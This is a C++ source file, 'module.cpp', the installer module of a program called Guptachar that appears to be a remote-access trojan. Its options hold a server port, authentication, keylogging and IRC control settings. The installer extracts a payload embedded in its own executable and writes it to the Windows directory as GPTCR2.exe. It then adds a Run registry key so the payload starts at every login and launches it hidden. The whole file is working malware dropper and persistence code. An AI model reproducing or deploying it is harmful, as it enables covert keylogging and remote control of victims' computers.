/*
    Guptachar Quick Installer Module
    Copyright (C) 2002 Ayan Chakrabarti

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

    module.cpp
    ==========

    The Guptachar Installer
*/

#include <windows.h>
#include <stdio.h>

#define FSIZE 25088

struct _options
{
        unsigned int guptport;  // Server Option

        char user[128];         // Authentication Options
        char pass[128];
        char auth[1024];
        char ifuseauth;

        unsigned int seq;      // KeyLogging Options
        char keylog;

        char ifirc;            // IRC Options
        char nick[1024];
        char host[1024];
        unsigned int port;
        char ifuseproxy;
        char proxy[1024];
        unsigned int pport;

} options;


void getoptname(char * fname)
{
        GetWindowsDirectory(fname,1000);
        if(fname[strlen(fname)-1] != '\\')
                strcat(fname,"\\");
        strcat(fname,"GPTCR.NFO");

}

void saveopts()
{
        FILE * fp;
        char fname[1024];

        getoptname(fname);
        fp = fopen(fname,"wt");
        if(!fp)
                return;
        fwrite((char *) &options, sizeof(options), 1, fp);
        fclose(fp);
}


int main(int argc, char ** argv)
{
        int ch;
        FILE *fp1,*fp2;
        char fn[1024];

        GetWindowsDirectory(fn,1000);
        strcat(fn,"\\GPTCR2.exe");

        fp1 = fopen(argv[0],"rb");
        fp2 = fopen(fn,"wb");
        if(!fp2)
        {
                fclose(fp1);
                return -1;
        }

        fseek(fp1,FSIZE,SEEK_SET);
        fread((char *) &options, sizeof(options), 1,fp1);

        ch = fgetc(fp1);
        while(!feof(fp1))
        {
                fputc(ch,fp2);
                ch = fgetc(fp1);
        }
        fclose(fp1);
        fclose(fp2);

        saveopts();

        LONG  lResult;
        HKEY  hKeyResult = 0;

        lResult = RegOpenKeyEx( HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKeyResult );

        if ( lResult == ERROR_SUCCESS )
        {
                lResult = RegSetValueEx( hKeyResult, "GPTCR2", 0, REG_SZ,
                                         fn,14);
                RegCloseKey( hKeyResult );   
        }

        WinExec(fn,0);

        return 0;
}
